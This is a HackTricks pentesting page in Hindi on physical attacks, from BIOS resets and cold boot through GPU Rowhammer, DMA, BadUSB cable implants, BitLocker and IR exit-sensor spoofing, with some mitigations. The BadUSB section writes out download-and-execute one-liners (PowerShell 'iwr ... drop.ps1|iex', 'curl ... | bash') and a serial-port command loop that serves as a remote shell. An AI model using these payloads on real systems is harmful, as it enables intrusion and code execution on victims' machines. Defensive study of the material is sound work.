# भौतिक हमले

{{#include ../banners/hacktricks-training.md}}

Board-level interface discovery, serial consoles, flash access, side channels और glitching के लिए [Hardware Hacking](hardware-hacking/README.md) और उसके interface-specific chapters देखें। यह पेज उन हमलों को कवर करता है जिनके लिए पूरे सिस्टम तक भौतिक पहुंच आवश्यक है।

## BIOS पासवर्ड रिकवरी और सिस्टम सुरक्षा

Legacy PC firmware की सेटिंग्स को CMOS बैटरी डिस्कनेक्ट करके या documented clear-CMOS jumper का उपयोग करके रीसेट किया जा सकता है। बिजली बंद रखने का आवश्यक समय board-specific होता है, और आधुनिक UEFI पासवर्ड या keys nonvolatile flash, embedded controller या security device में हो सकती हैं, इसलिए वे बैटरी निकालने के बाद भी बनी रह सकती हैं। Pins को short करने से पहले board/service manual देखें; इस प्रक्रिया से TPM measurements भी अमान्य हो सकते हैं और disk-encryption recovery शुरू हो सकती है।

Legacy x86 सिस्टम पर, **killCMOS** और **CmosPwd** जैसे tools bootable environment से CMOS-backed settings की जांच या उनमें बदलाव कर सकते हैं। CmosPwd पुराने BIOS families के documented set से password formats पहचानता है और CMOS state का backup, restore या erase/kill कर सकता है; इसके प्रकाशित builds legacy DOS/Windows, Linux, FreeBSD और NetBSD environments को target करते हैं।<sup>[[18]](#references)</sup> ये utilities सामान्य UEFI password removers नहीं हैं और इनके लिए पर्याप्त hardware/firmware access आवश्यक है।

कुछ laptop firmware में कई असफल password attempts के बाद vendor-specific challenge code दिखता है। [bios-pw.org](https://bios-pw.org) जैसे databases कुछ models के लिए legacy vendor recovery passwords निकाल सकते हैं, लेकिन कई सिस्टम ऐसा lockout लागू करते हैं जिसमें challenge से password निकाला नहीं जा सकता। किसी भी generated password को model-specific मानें और permanent attempt counters को समाप्त होने से बचें।

### UEFI सुरक्षा

आधुनिक **UEFI** सिस्टम के लिए, CHIPSEC Secure Boot variable protections का audit कर सकता है। नीचे दिए गए non-modifying check से शुरुआत करें; वैकल्पिक `-a modify` mode जानबूझकर variables को corrupt करने का प्रयास करता है और इसका उपयोग केवल ऐसे lab system पर किया जाना चाहिए जिसे recover किया जा सके। CHIPSEC स्वयं चेतावनी देता है कि उसका privileged driver और low-level hardware access production endpoints के लिए अनुपयुक्त हैं।<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analysis और Cold Boot Attacks

Refresh रुकने पर DRAM तुरंत हर bit नहीं खोता। Decay rate module technology और temperature के अनुसार काफी बदलती है; cooling से uncooled power cycle की तुलना में उपयोगी data कहीं अधिक समय तक सुरक्षित रह सकता है। Cold-boot attack में तेजी से reboot करके छोटे acquisition environment में प्रवेश किया जाता है या cooled module को transfer किया जाता है, raw memory capture की जाती है, और bit decay के बावजूद cryptographic keys reconstruct की जाती हैं। Disk-copy utility अपने-आप physical-memory imager नहीं होती, और Volatility capture का analysis करता है, उसे acquire नहीं; platform के अनुकूल, validated acquisition tool इस्तेमाल करें।<sup>[[12]](#references)</sup>

---

## Page Tables के विरुद्ध GPU Rowhammer

आधुनिक GPU Rowhammer attacks तब कहीं अधिक उपयोगी हो जाते हैं जब वे सामान्य buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हाल के शोध से पता चलता है कि unprivileged CUDA code चलाने वाला attacker GPU-विशिष्ट hammering patterns बना सकता है, paging structures को vulnerable rows में रखने के लिए **memory massaging** का उपयोग कर सकता है, और फिर **last-level page table** या intermediate **page directory** में bits flip कर सकता है। एक translation entry corrupt होते ही attacker **arbitrary GPU memory read/write** हासिल कर सकता है और फिर host compromise तक pivot कर सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows का profile** बनाएं और in-DRAM mitigations को bypass करने वाले refresh-aware / non-uniform hammering patterns तैयार करें।
2. **GPU allocations को massage** करें ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations में रखे। व्यवहार में, इसमें low-memory page-table region को exhaust करना और controlled strides के साथ बड़े sparse UVM mappings को spray करना शामिल हो सकता है।
3. Page-table / page-directory entry के अंदर **PFN** या aperture-संबंधित bits जैसे **translation metadata को flip** करें, ताकि attacker-controlled virtual page page-table pages, arbitrary GPU memory, या host-visible system mappings पर resolve हो।
4. Forged mapping का पुनः उपयोग करके अतिरिक्त translation entries को rewrite करें और GPU contexts में **arbitrary GPU memory read/write** तक escalate करें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU के सामने arbitrary **host physical memory** उजागर कर सकती हैं, जिससे GPU primitive full host compromise में बदल जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है, क्योंकि एक bit flip बड़े translation subtree को retarget कर सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** अब भी महत्वपूर्ण है, क्योंकि यह GDDRHammer/GeForge द्वारा इस्तेमाल किए जाने वाले direct arbitrary-host-memory path को रोकता है, लेकिन यह **complete mitigation नहीं** है। **GPUBreach** दूसरे चरण का pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver memory-safety bugs trigger करके kernel write primitive तथा **root shell** हासिल करता है—IOMMU enabled होने पर भी।<sup>[[3]](#references)</sup>
- Supported workstation/server GPUs पर **system-level ECC** एक व्यावहारिक hardening उपाय है। ECC के बिना consumer GPUs में defense surface कमजोर होता है।<sup>[[4]](#references)</sup>
- ये attacks केवल सैद्धांतिक नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips रिपोर्ट किए, जो working host-privilege-escalation chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

ऐसी offline UEFI IFR/NVRAM patching के लिए, जो pre-boot IOMMU enforcement को downgrade करके Windows DMA chain सक्षम कर सकती है, देखें:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** FireWire और शुरुआती Thunderbolt configurations जैसे interfaces पर **DMA-based memory acquisition and patching** प्रदर्शित करता है, जिसमें ऐतिहासिक login-bypass signatures भी शामिल हैं। यह बस “Windows 10 के विरुद्ध अप्रभावी” नहीं है: exploitability interface, target build, IOMMU policy, lock state, और Windows Kernel DMA Protection के supported तथा enabled होने पर निर्भर करती है। Windows 10 version 1803 और बाद के versions ने compatible platforms पर Kernel DMA Protection पेश किया, जिससे attack surface में काफी बदलाव आया।<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access के लिए Live CD/USB

Unencrypted या पहले से unlocked Windows volume पर, offline environment **sethc.exe** या **Utilman.exe** जैसी accessibility binaries को **cmd.exe** से बदल सकता है। इससे संबंधित logon-screen shortcut चलाने पर SYSTEM command prompt मिलता है। **chntpw** जैसे tools local SAM account data edit कर सकते हैं। ये तरीके locked BitLocker volume को bypass नहीं करते और DPAPI/EFS से सुरक्षित credentials को नुकसान पहुँचा सकते हैं; forensic copies और backups सुरक्षित रखें।

**Kon-Boot** supported Windows/macOS configurations के लिए एक commercial boot-time authentication-bypass tool है। Compatibility OS, firmware mode, Secure Boot और disk-encryption setup पर निर्भर करती है; यह BitLocker-locked volume को decrypt नहीं करता।<sup>[[10]](#references)</sup>

---

## Windows Security Features को संभालना

### Boot और Recovery Shortcuts

- **Delete/Supr**, F2, F10 या कोई अन्य vendor key firmware setup खोल सकती है।
- **F8** केवल उन configurations में legacy Windows advanced boot options खोलता है जहाँ यह रास्ता अब भी enabled हो; मौजूदा recovery entry अलग-अलग हो सकती है।
- **Shift** दबाए रखने से कुछ configurations में Windows automatic logon रुक सकता है, हालांकि policy/registry settings इस व्यवहार को disable कर सकती हैं।<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** और Teensy boards जैसे devices trusted HID keyboards के रूप में enumerate होकर पहले से तय keystrokes inject कर सकते हैं। Payload को शुरुआत में logged-on session के privileges और desktop access मिलते हैं; UAC prompts, screen locking, keyboard layout, timing और endpoint USB policy फिर भी इसे सीमित करते हैं।<sup>[[15]](#references)</sup>

Programmable peripherals host kernel parsers पर भी attack कर सकते हैं और heap grooming तथा information disclosure के लिए कई USB devices को coordinate कर सकते हैं:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Windows UAS mass-storage parser के एक मामले के लिए देखें:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Administrator या backup privileges से shadow copy बनाई जा सकती है या registry hives save किए जा सकते हैं, ताकि **SAM** और **SYSTEM** जैसी locked files acquire की जा सकें। यह post-compromise collection technique है, privilege bypass नहीं; इसे `diskshadow`/VSS और registry-hive export events के साथ correlate करना चाहिए।

## BadUSB / HID Implant Techniques

### NFC-triggered Android HID gadget

Rooted Android phone programmable USB keyboard तभी बन सकता है जब उसके USB controller और kernel में **USB gadget/HID support** हो। Compatible devices पर Kali NetHunter **USB Arsenal** के माध्यम से gadget profiles उपलब्ध कराता है। एक अन्य विकल्प [USB Gadget Tool](https://github.com/tejado/android-usb-gadget) है, जो ConfigFS gadget functions बनाता है और `/dev/hidg0` तथा `/dev/hidg1` जैसे keyboard/mouse character devices उपलब्ध करा सकता है। यह tool केवल gadget endpoint बनाता है; उसमें HID reports लिखने के लिए अलग process की आवश्यकता होती है। Root access ऐसे kernel की भरपाई नहीं कर सकता जिसमें ConfigFS, HID gadget support या usable USB Device Controller न हो।<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

इस endpoint को physical trigger के रूप में Android NFC के साथ जोड़ा जा सकता है। [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) app tag UID पढ़ता है, उसे अपेक्षित representation में बदलता है, local whitelist से जाँचता है, और match होने पर configured Rubber Ducky-style keyboard sequence भेजता है। Connected host को सामान्य keyboard input दिखाई देता है और उसे NFC software की आवश्यकता नहीं होती।<sup>[[22]](#references)[[24]](#references)</sup>

Shortcuts या commands इस्तेमाल करने से पहले blank text editor में enumeration और keyboard layout validate करें। एक harmless payload है:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

महत्वपूर्ण विश्वास सीमाएँ:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist पहचान है, authentication नहीं**। UIDs सार्वजनिक होते हैं और कुछ token प्रकार या emulators cloning या impersonation की अनुमति देते हैं। कॉपी किया गया allowed UID, original token वाले dispatch path का ही अनुसरण करता है।
- **NfcScreenOff** Magisk module, NFC service को patch करता है ताकि वह ऐसे काम करे मानो screen चालू और unlocked हो। अगर phone पहले से किसी host से जुड़ा है, तो इससे कोई व्यक्ति phone unlock किए बिना payload trigger कर सकता है।
- Payload में संग्रहीत passwords, API tokens और commands, rooted या bootloader-unlocked device पर recover किए जा सकते हैं। HID के ज़रिए password टाइप करना reusable-password automation है, passwordless authentication नहीं।
- HID injection, active desktop के privileges के साथ काम करता है और focus, timing तथा host keyboard layout पर निर्भर करता है। Sensitive actions dispatch करने से पहले हाल की user confirmation ज़रूरी करें, scripts में privileged secrets रखने से बचें, और वास्तविक authentication के लिए cryptographic challenge-response authenticator का उपयोग करें।

### Wi-Fi-प्रबंधित केबल इम्प्लांट्स

- **Evil Crow Cable Wind** जैसे ESP32-S3 आधारित implants, USB-A→USB-C या USB-C↔USB-C cables के अंदर छिपे होते हैं, केवल USB keyboard के रूप में enumerate होते हैं, और अपना C2 stack Wi-Fi पर उपलब्ध कराते हैं। Operator को बस victim host से cable को power देनी होती है, `Evil Crow Cable Wind` नाम का hotspot बनाना होता है जिसका password `123456789` हो, और embedded HTTP interface तक पहुँचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसका DHCP address) खोलना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, और *Config* के लिए tabs उपलब्ध हैं। Stored payloads को OS के अनुसार tag किया जाता है, keyboard layouts को चलते-चलते बदला जा सकता है, और VID/PID strings को बदलकर ज्ञात peripherals की नकल की जा सकती है।
- चूँकि C2 केबल के अंदर रहता है, इसलिए फोन payloads stage कर सकता है, execution trigger कर सकता है, और Wi-Fi credentials को manage कर सकता है—इसके लिए संगठन के network का उपयोग करने की ज़रूरत नहीं होती। कम dwell-time वाली physical intrusions में यह उपयोगी है।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद चलने के लिए bind करते हैं। Implant हल्की OS fingerprinting करता है और उससे मेल खाने वाली script चुनता है।
- उदाहरण workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`।
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`।
- चूँकि execution बिना निगरानी के होता है, इसलिए charging cable को बस बदलकर logged-on user के context में “plug-and-pwn” initial access हासिल किया जा सकता है।

### Wi-Fi TCP पर HID-bootstrapped remote shell

1. **Keystroke bootstrap:** एक stored payload console खोलता है और ऐसा loop paste करता है जो नए USB serial device पर आने वाली किसी भी चीज़ को execute करता है। Windows का एक minimal variant है:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant USB CDC channel को खुला रखता है, जबकि उसका ESP32-S3 operator से वापस जुड़ने के लिए TCP client (Python script, Android APK या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए सभी bytes ऊपर दिए गए serial loop में भेजे जाते हैं, जिससे air-gapped hosts पर भी remote command execution संभव होता है। Output सीमित होता है, इसलिए operators आमतौर पर blind commands (account creation, अतिरिक्त tooling को staging करना आदि) चलाते हैं।

### HTTP OTA update surface

- दस्तावेज़ीकृत Evil Crow Cable Wind interface, `/update` पर बिना authentication वाला firmware-update endpoint उपलब्ध कराता है:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators engagement के बीच में केबल खोले बिना सुविधाएँ hot-swap कर सकते हैं (जैसे, flash USB Army Knife firmware), जिससे implant target host से जुड़ा रहते हुए नई क्षमताओं पर pivot कर सकता है।

## BitLocker Encryption को बायपास करना

Live या हाल ही में चल रहे system का अधिकृत forensic acquisition, volume अनलॉक होने के दौरान BitLocker volume master key या उससे संबंधित key material को शामिल कर सकता है। Elcomsoft Forensic Disk Decryptor और Passware Kit Forensic जैसे commercial tools समर्थित memory images, hibernation files या crash dumps में खोज कर सकते हैं, लेकिन सफलता की गारंटी नहीं है। BitLocker सक्षम होने पर आधुनिक Windows crash dumps को भी encrypt करता है, और संग्रहित 48-digit recovery password, memory में मौजूद volume key से अलग artifact है।<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key जोड़ने के लिए Social Engineering

जो attacker किसी administrator को BitLocker-management commands चलाने के लिए राज़ी कर लेता है, वह recovery-password, external-key या अन्य protector जोड़कर उसे capture कर सकता है। Recovery password मनमाने ढंग से चुने गए शून्यों की string नहीं हो सकता: BitLocker numerical recovery passwords का format मान्य 48-digit format होना चाहिए। संबंधित अधिकृत-administration syntax है `manage-bde -protectors -add C: -recoverypassword`; जोड़े गए protectors की सूची `manage-bde -protectors -get C:` से देखें। Protector जोड़ने की घटनाओं पर निगरानी रखें और सुनिश्चित करें कि नया recovery material केवल स्वीकृत स्थानों पर escrow किया जाए।<sup>[[16]](#references)</sup>

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई आधुनिक laptops और छोटे form-factor वाले desktops में **chassis-intrusion switch** होता है, जिसकी निगरानी Embedded Controller (EC) और BIOS/UEFI firmware करते हैं। हालाँकि switch का मुख्य उद्देश्य device खोले जाने पर alert देना है, लेकिन कुछ vendors **undocumented recovery shortcut** लागू करते हैं, जो switch को किसी खास pattern में toggle करने पर सक्रिय होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch, EC के **GPIO interrupt** से जुड़ा होता है।
2. EC पर चल रहा firmware **presses के समय और संख्या** का हिसाब रखता है।
3. Hard-coded pattern की पहचान होने पर EC एक *mainboard-reset* routine चलाता है, जो **system NVRAM/CMOS की सामग्री मिटा देता है**।
4. अगले boot पर, प्रभावित models firmware की reset state लोड करते हैं। Vendor और revision के आधार पर, मिटाई गई state में supervisor password, custom boot settings या enrolled Secure Boot keys शामिल हो सकती हैं; TPM state और disk-encryption पर पड़ने वाले प्रभावों का अलग से आकलन करना चाहिए।

> Firmware reset से external-boot options बहाल हो सकते हैं, लेकिन यह storage को **decrypt नहीं** करता। TPM/firmware में बदलाव के बाद BitLocker या कोई अन्य full-disk encryption system recovery की माँग कर सकता है और recovery key के बिना भी internal drive को सुरक्षित रख सकता है।<sup>[[16]](#references)</sup>

### वास्तविक उदाहरण – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) का recovery shortcut है:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

दसवें चक्र के बाद EC एक flag सेट करता है, जो BIOS को अगले reboot पर NVRAM मिटाने का निर्देश देता है। पूरी प्रक्रिया में लगभग 40 सेकंड लगते हैं और इसके लिए **सिर्फ़ एक screwdriver** चाहिए।<sup>[[5]](#references)</sup>

### सामान्य Exploitation प्रक्रिया

1. Target को power-on करें या suspend-resume करें, ताकि EC चल रहा हो।
2. नीचे का cover हटाकर intrusion/maintenance switch तक पहुँचें।
3. Vendor-विशिष्ट toggle pattern दोहराएँ (दस्तावेज़, forums देखें या EC firmware को reverse-engineer करें)।
4. फिर से जोड़कर reboot करें, और जाँचें कि वास्तव में कौन-सी firmware settings और credentials बदले हैं।
5. यदि अधिकृत हो और external boot उपलब्ध हो, तो किसी नियंत्रित live image से boot करें। जब internal volume को वैध रूप से unlock कर लिया जाए (या वह कभी encrypted न रहा हो), तो live environment credentials और data प्राप्त कर सकता है या EFI System Partition की जाँच कर सकता है। EFI implant install करने के लिए उस partition में बदलाव करना स्थायी और अत्यधिक घुसपैठ वाला है, और यह Secure Boot, measured boot, firmware write protection तथा endpoint monitoring की सीमाओं के अधीन रहता है। Encrypted storage उसकी key या recovery material के बिना पहुँच से बाहर रहता है।

### Detection और Mitigation

* OS management console में chassis-intrusion events लॉग करें और उन्हें अप्रत्याशित BIOS resets से correlate करें।
* खोलने का पता लगाने के लिए screws/covers पर **tamper-evident seals** लगाएँ।
* Devices को **भौतिक रूप से नियंत्रित क्षेत्रों** में रखें; मानकर चलें कि physical access का अर्थ full compromise है।
* जहाँ उपलब्ध हो, vendor का “maintenance switch reset” feature disable करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation अनिवार्य करें।

---

## No-Touch Exit Sensors के विरुद्ध Covert IR Injection

### Sensor की विशेषताएँ
- सामान्य “wave-to-exit” sensors में near-IR LED emitter के साथ TV remote जैसे receiver module का उपयोग होता है। यह केवल सही carrier (लगभग 30 kHz) के कई pulses (~4–10) देखने के बाद ही logic high रिपोर्ट करता है।<sup>[[7]](#references)</sup>
- Plastic shroud emitter और receiver को एक-दूसरे की ओर सीधे देखने से रोकता है, इसलिए controller मानता है कि कोई भी validated carrier पास की सतह से परावर्तित होकर आया है और दरवाज़े का strike खोलने वाला relay सक्रिय कर देता है।
- Controller को target मौजूद होने का संकेत मिलते ही वह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver filtered carrier से मेल खाने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack Workflow
1. **Emission profile capture करें** – controller pins के across logic analyser लगाकर internal IR LED को चलाने वाले pre-detection और post-detection, दोनों waveforms रिकॉर्ड करें।
2. **केवल “post-detection” waveform replay करें** – stock emitter को हटाएँ/अनदेखा करें और शुरुआत से ही पहले से triggered pattern के साथ external IR LED चलाएँ। चूँकि receiver केवल pulse count/frequency पर ध्यान देता है, वह spoofed carrier को असली reflection मानता है और relay line को assert कर देता है।
3. **Transmission को नियंत्रित करें** – receiver के AGC या interference-handling logic को saturate किए बिना न्यूनतम pulse count देने के लिए carrier को उपयुक्त bursts में transmit करें (जैसे, कुछ दसियों milliseconds चालू और लगभग उतने ही समय बंद)। लगातार emission से sensor जल्दी desensitise हो जाता है और relay सक्रिय होना बंद कर देता है।

### Long-Range Reflective Injection
- Bench LED की जगह high-power IR diode, MOSFET driver और focusing optics लगाने से लगभग 6 m दूर से भरोसेमंद triggering संभव होती है।
- Attacker को receiver aperture तक line-of-sight की ज़रूरत नहीं होती; beam को ऐसी अंदरूनी दीवारों, shelving या door frames पर लक्षित करने से, जो glass के पार दिखाई देते हैं, परावर्तित ऊर्जा लगभग 30° के field of view में प्रवेश कर सकती है और पास से हाथ हिलाने जैसा प्रभाव देती है।
- चूँकि receivers केवल कमजोर reflections की अपेक्षा करते हैं, इसलिए बाहरी beam कहीं अधिक शक्तिशाली होने पर भी कई सतहों से टकराकर detection threshold से ऊपर रह सकती है।

### Weaponised Attack Torch
- Driver को सामान्य flashlight के अंदर लगाने से tool खुली नज़र में भी छिपा रहता है। दिखाई देने वाली LED को receiver के band से मेल खाने वाली high-power IR LED से बदलें, लगभग 30 kHz bursts बनाने के लिए ATtiny412 (या ऐसा ही कुछ) जोड़ें, और LED current sink करने के लिए MOSFET इस्तेमाल करें।
- Telescopic zoom lens beam को लंबी दूरी और सटीकता के लिए संकीर्ण करता है, जबकि MCU के नियंत्रण वाला vibration motor बिना visible light निकाले modulation सक्रिय होने की haptic पुष्टि देता है।
- कई सहेजे हुए modulation patterns (थोड़ी अलग carrier frequencies और envelopes) के बीच switch करने से rebranded sensor families के साथ compatibility बढ़ती है। इससे operator reflective surfaces पर तब तक प्रयास कर सकता है, जब तक relay के click की आवाज़ न आए और दरवाज़ा न खुल जाए।

---

## References

- [1] [GDDRHammer: DRAM rows को अत्यधिक बाधित करना — आधुनिक GPUs से किए गए Cross-Component Rowhammer Attacks](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GPU Page Tables को गढ़ने के लिए GDDR Memory पर Hammering — मनोरंजन और लाभ के लिए](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer का उपयोग करके GPUs पर Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - जुलाई 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. यहाँ दबाएँ और pwn करें”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch से IR No-Touch Exit Sensors को bypass करना”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind से Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips के विरुद्ध Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot का आधिकारिक documentation और compatibility जानकारी](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keys पर Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA के ज़रिए physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift दबाए रखने और automatic logon के व्यवहार के बारे में](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation और downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Rooted Android Phone को अपने PC के लिए NFC Authenticator और Automation Tool में बदलें](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
